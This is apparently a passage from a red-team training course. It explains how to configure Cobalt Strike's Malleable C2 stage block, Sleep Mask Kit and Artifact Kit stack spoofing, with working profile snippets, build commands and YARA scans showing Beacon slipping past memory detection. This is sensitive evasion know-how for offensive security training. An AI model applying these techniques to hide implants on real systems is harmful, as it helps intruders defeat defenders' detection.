It's important to understand that the reflective loader is performing its own style of injection within the process.  It will allocate a block of memory, copy Beacon into it, and executes.  These behaviours are controlled via the `stage` malleable C2 block.

The first option is `allocator`, which controls the API used to allocate the memory region.  By default, **HeapAlloc** is used.  If you wish, this can be changed to **MapViewOfFile** or **VirtualAlloc**.  This doesn't change anything in regards to memory permissions, but good to know if you suspect the reflective loader is being detected due to this API call.

To prevent the use of RWX permissions, set `userwx` to **false**.  This will tell the reflective loader to allocate as RW and then flip to RX, the same as we've been doing in our injectors.

Finally, to clean up the memory region associated with the reflective loader, set `cleanup` to **true**.
```json
stage {
        set userwx "false";
        set cleanup "true";
}
```

If we generate and inject new shellcode with this profile we'll see Beacon split across different regions, each with correct permissions.  The header (RW), the main Beacon (RX) and everything else (RW).

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/rwx/rx-only.png)

# Sleep Mask Kit

Cobalt Strike has several capabilities which allow operators to change how the Beacon payload appears in memory.  These are helpful when evading defences such as memory scanners.  One such capability is the Sleep Mask Kit and will be the focus of this section.

##### Since Cobalt Strike 4.6, the individual kits have been combined into a single "Arsenal Kit", but I still reference the individual naming schemes.

To demonstrate it, let's start with some basic Beacon shellcode.  Inspecting the relevant regions of a process injected with Beacon shellcode, it's obvious that there's a PE running in memory.  It wouldn't be difficult for a memory scanner to find this and flag it as suspicious.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_default.png)

We can demonstrate this using YARA.  Consider the following rule:
```json
rule beacon_strings {

    strings:
        $a = "beacon.x64.dll"
        $b = "ReflectiveLoader"
        $c = "%02d/%02d/%02d %02d:%02d:%02d"
        $d = "%s as %s\\%s: %d"

    condition:
        any of them
}
```

I've picked out some strings that appear in this default Beacon shellcode.

#####  `strings beacon.bin` is useful.

The YARA CLI tool can be used to scan running processes and evaluate them against such rules (where 8364 is the PID of Notepad containing Beacon).
```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 8364
beacon_strings 8364
0x25f179fc8f2:$a: beacon.x64.dll
0x25f179fc901:$b: ReflectiveLoader
0x25f179ed72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x25f179ed758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x25f179ed700:$d: %s as %s\%s: %d
```
  
This output shows that YARA was able to match these strings against the memory region Beacon is living in.  You can also search for strings using Process Hacker and corroborate the results.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_x64_dll.png)

Malleable C2 has a set of transforms that can be added to the stage block.  One of those is `strrep`, short for string replacement.
```json
stage {
        set userwx "false";
        set cleanup "true";

        transform-x64 {
                strrep "beacon.x64.dll" "data.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```

This can replace strings with Beacon's reflective DLL.  If we use this profile and generate new shellcode, YARA flags on fewer strings.
```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6368
beacon_strings 6368
0x1a475bfd72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x1a475bfd758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x1a475bfd700:$d: %s as %s\%s: %d
```
  

---

#### Warning on String Replacement

I've seen people attempt to replace practically every string they can find in the Beacon payload, break functionality, and not understand why.  Take the following example:
```
strrep "HTTP/1.1 200 OK" "";
```

Beacon contains a tiny built-in HTTP server, used in workflows such as `powershell-import`, `powershell` and `powerpick`.  Imported scripts are fetched and executed from this internal webserver.
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-Domain

beacon> powerpick Get-Domain
[+] received output:
ERROR: DownloadString : Exception calling "DownloadString" with "1" argument(s): "The server committed a p
ERROR: rotocol violation. Section=ResponseStatusLine"
ERROR: 
ERROR: At line:1 char:46
ERROR: + IEX (New-Object Net.Webclient).DownloadString <<<< ('http://127.0.0.1:41100/'); Get-Domain
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DotNetMethodException
ERROR:  
ERROR: Get-Domain : The term 'Get-Domain' is not recognized as the name of a cmdlet, function, script file
ERROR: , or operable program. Check the spelling of the name, or if a path was included, verify that the p
ERROR: ath is correct and try again.
```

PowerShell throws a _protocol violation_, because Beacon's internal server is no longer returning properly-formatted HTTP responses.  This can be seen in these example Wireshark captures.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/strrep-fail.png)


There are more indicators within memory than simple strings, so the Sleep Mask was added as a means of providing more fine-grained control.  This allows Beacon to completely obfuscate its memory whilst sleeping.  Just prior to going to sleep, Beacon walks its own memory sections and XORs them with a random key.  After the sleep has elapsed, it walks back over the same sections and restores them.  It's important to know that Beacon is only obfuscated whilst it's not doing anything.  It must deobfuscate itself to check-in and execute jobs.

To enable the Sleep Mask, add the `sleep_mask` directive into C2 profile, generate new shellcode and inject it.
```json
stage {
        set userwx "false";
        set cleanup "true";
        set sleep_mask "true";

        transform-x64 {
                strrep "beacon.x64.dll" "not-beacon.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```

Now when we inspect Beacon's memory, we just see garbage and YARA fails to identify any of the previous strings.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_default_sleep_mask.png)

```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6016
C:\Tools\YARA>
```

If you set Beacon's sleep time to 0 and run the YARA rules again, you will find instances where either nothing is detected or the previous strings are detected.
```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6016
beacon_strings 6016
0x2414166d72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x2414166d758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x2414166d700:$d: %s as %s\%s: %d
```

This depends on whether you catch Beacon whilst it's asleep or not.  This is why seemingly inferior techniques such as `strrep` are useful in conjunction with `sleep_mask` and why low sleep times can also destroy your OPSEC.

This sleep mask feature has gone through several revisions since it was introduced.  At first memory was XOR'd with a single byte key, now, a 13-byte key is used.  Some clever folk over at Elastic wrote a YARA rule to identify part of the deobfuscation routine.

It looks something like this:
```json
rule beacon_default_sleep_mask {

    strings:
        $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
        $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}

    condition:
        any of them
}
```

This allows YARA to identify Beacon running in memory even whilst obfuscated.
```
C:\Tools\YARA>yara64.exe -s beacon-default-sleep-mask.yara 6016
beacon_default_sleep_mask 6016
0x24141650d75:$a_x64: 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03
0x24141650f0d:$a_x64: 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03
```

This is where the Sleep Mask Kit comes into play - it allows operators to customise how Beacon obfuscates and deobfuscates itself in memory.

The structure of each kit is quite straight forward.  The top level contains a README, a build script, a template aggressor script, and a source code directory.  The README in particular should be consulted as it outlines several aspects that should be taken into account before modifying the sleep mask.

The source code comes in three files:  `sleepmask.c`, `sleepmask_smb.c` and `sleepmask_tcp.c`.
```bash
ubuntu@teamserver ~/c/a/k/sleepmask> pwd
/home/ubuntu/cobaltstrike/arsenal-kit/kits/sleepmask
ubuntu@teamserver ~/c/a/k/sleepmask> ll -R
.:
total 16K
-rw-r--r-- 1 ubuntu ubuntu 3.1K Apr 26 20:37 README.md
-rwxr--r-- 1 ubuntu ubuntu 2.4K Apr 26 20:37 build.sh*
-rw-r--r-- 1 ubuntu ubuntu  896 Apr 26 20:37 script_template.cna
drwxrwxr-x 2 ubuntu ubuntu 4.0K Apr 26 20:37 src/

./src:
total 12K
-rw-r--r-- 1 ubuntu ubuntu 2.1K Apr 26 20:37 sleepmask.c
-rw-r--r-- 1 ubuntu ubuntu 3.0K Apr 26 20:37 sleepmask_smb.c
-rw-r--r-- 1 ubuntu ubuntu 2.5K Apr 26 20:37 sleepmask_tcp.c
```

Each type of Beacon has its own sleep mask implementation.  Although we're only going to look at `sleepmask.c` (used by the HTTP, HTTPS and DNS Beacons) in this section, the same principal applies to all of them.

Let's review the code.  First, we have two struct definitions called `HEAP_RECORD` and `SLEEPMASKP`.
```c
/*
 *  ptr  - pointer to the base address of the allocated memory.
 *  size - the number of bytes allocated for the ptr.
 */
typedef struct {
        char * ptr;
        size_t size;
} HEAP_RECORD;

/*
 *  beacon_ptr   - pointer to beacon's base address
 *  sections     - list of memory sections beacon wants to mask.
 *                 A section is denoted by a pair indicating the start and end index locations.
 *                 The list is terminated by the start and end locations of 0 and 0.
 *  heap_records - list of memory addresses on the heap beacon wants to mask. 
 *                 The list is terminated by the HEAP_RECORD.ptr set to NULL. 
 *  mask         - the mask that beacon randomly generated to apply
 */
typedef struct {
        char  * beacon_ptr;
        DWORD * sections;
        HEAP_RECORD * heap_records;
        char    mask[MASK_SIZE];
} SLEEPMASKP;
``` 

The comments in the source make it easy to understand what each property is for.

Second, we have a method called sleep_mask which brings in a pointer to a `SLEEPMASKP` struct, a pointer to Beacon's sleep function, and the amount of time the Beacon was requested to sleep for.
```c
void sleep_mask(SLEEPMASKP * parms, void(__stdcall *pSleep)(DWORD), DWORD time)
```

Essentially, prior to sleeping, the sleep mask will walk Beacon's memory sections and heap allocations, and XOR's each byte with a key.  It will then sleep for the specified amount of time.  When it wakes, it walks back over the memory, restoring each byte to its original value, and then returns execution back to Beacon.

The default implementation uses XOR, but you're not limited to this.  You can pretty much do anything you want, as long as the compiled size comes in under 769 bytes.  Most of the time, you don't have to do anything crazy complex - just something that's different from the default to break these static signatures.  Sometimes, you can also just re-compile the existing code without making any changes.  Differences in compilers and library versions etc can produce an output that's sufficiently different to the signature(s).

To build the kit, run `build.sh`. and specify an output directory.
```bash
ubuntu@teamserver ~/c/a/k/sleepmask> sudo ./build.sh /tmp/sleepmask
[Sleepmask kit] [+] You have a x86_64 mingw--I will recompile the sleepmask beacon object files
[Sleepmask kit] [*] Compile sleepmask.x86.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x86.o
[Sleepmask kit] [*] Compile sleepmask_smb.x86.o
[Sleepmask kit] [*] Compile sleepmask.x64.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x64.o
[Sleepmask kit] [*] Compile sleepmask_smb.x64.o
[Sleepmask kit] [+] The sleepmask beacon object files are saved in '/tmp/sleepmask'
ubuntu@teamserver ~/c/a/k/sleepmask> ll /tmp/sleepmask
total 28K
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask.cna
-rw-r--r-- 1 root root  891 May 30 09:38 sleepmask.x64.o
-rw-r--r-- 1 root root  634 May 30 09:38 sleepmask.x86.o
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask_smb.x64.o
-rw-r--r-- 1 root root  846 May 30 09:38 sleepmask_smb.x86.o
-rw-r--r-- 1 root root 1007 May 30 09:38 sleepmask_tcp.x64.o
-rw-r--r-- 1 root root  798 May 30 09:38 sleepmask_tcp.x86.o
```

##### The build scripts run `rm -rf` on the output directory, so don't use something like `/home/ubuntu` (I learned the hard way).

The output will include x64 and x86 builds for each sleep mask variant, and an aggressor script.  Copy the folder to the Windows Attacker VM.
```c
C:\Users\Administrator\Desktop>pscp -r -i ssh.ppk ubuntu@10.10.0.69:/tmp/sleepmask C:\Tools\cobaltstrike
sleepmask_tcp.x64.o       | 0 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
sleepmask.x64.o           | 0 kB |   0.9 kB/s | ETA: 00:00:00 | 100%
sleepmask.x86.o           | 0 kB |   0.6 kB/s | ETA: 00:00:00 | 100%
sleepmask.cna             | 1 kB |   1.1 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x64.o       | 1 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_tcp.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
```

Go to **Cobalt Strike > Script Manager**, click **Load** and select `sleepmask.cna`.  To test the mask, generate and execute a new Beacon payload.

##### Already running Beacons will not have this new mask applied to them, only new Beacons.

The YARA rule for the default sleep mask no longer detects Beacon.
```
C:\Tools\YARA>yara64.exe -s beacon-default-sleep-mask.yara 2248
C:\Tools\YARA>
```

# Thread Stack Spoofing

Thread Stack, or Call Stack Spoofing, is an in-memory evasion technique which aims to hide references to shellcode on a call stack.  But first - what is a call stack?  In general terms, a "stack" is a LIFO (last in, first out) collection, where data can be "pushed" (added) or "popped" (removed).

![](https://miro.medium.com/max/874/1*rLV0q6if8Drx1PbrncybXw.png)
Image credit:  Ryan Mariner Farney

The main purpose of a call stack (particularly in this context) is to keep track of where a routine should return to once it's finished executing.  For instance, the MessageBoxW API in kernel32.dll has no knowledge of anything that may call it.  Before calling this API, a return address is pushed onto the stack, so that once MessageBoxW has finished, execution flow can return back to the calling application.

Let's see what this means in the context of Beacon.  Here, I have a Beacon running on Attacker Windows using the default EXE artefact.  Process Hacker can display the running threads.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/no-spoof-threads.png)

Double-click (or right-click > Inspect) on the main (highlighted) thread will reveal the content of the call stack.  Here, we can see a call to **SleepEx** in `KernelBase.dll` and then two seemingly random memory addresses.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/call-stack-4360.png)

Cross-referencing the memory regions, we find that it leads us straight to the Beacon payload in memory.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/mapped-pe.png)

This is showing that after the SleepEx call has completed, execution will return to Beacon, because this is where the API was called from.  The main red flag being that the reference is directly to a memory address, rather than an exported function.  This can be picked up by both automated tooling and manual analysis.

Stack spoofing can be enabled via the Artifact Kit by setting the "stack spoof" option to `true`.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/build-script.png)

For example:  `./build.sh pipe VirtualAlloc 271360 5 true true /tmp/dist>`.  Copy the artifacts across to the Windows machine, load the CNA script and generate a new payload.  When inspecting this process inside Process Hacker, we will see that the call stack for the main thread looks a little different.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/call-stack-6416.png)

The direct reference to memory addresses have been replaced.

At the time of writing, this implementation hooks the Beacon sleep function and [](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers)overwrites its memory with a  small [trampoline](https://en.wikipedia.org/wiki/Trampoline_(computing)).  This zeros out the return address to prevent stack walking.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/stack-spoof/x64-trampoline.png)

After setting up the trampoline, it uses [Fiber](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers) APIs such as CreateFiber, SwitchToFiber and DeleteFiber to execute alternate units of work, like WaitForSingleObject.

The source code for achieving this is in `arsenal-kit/kits/artifact/src-common/spoof.c`.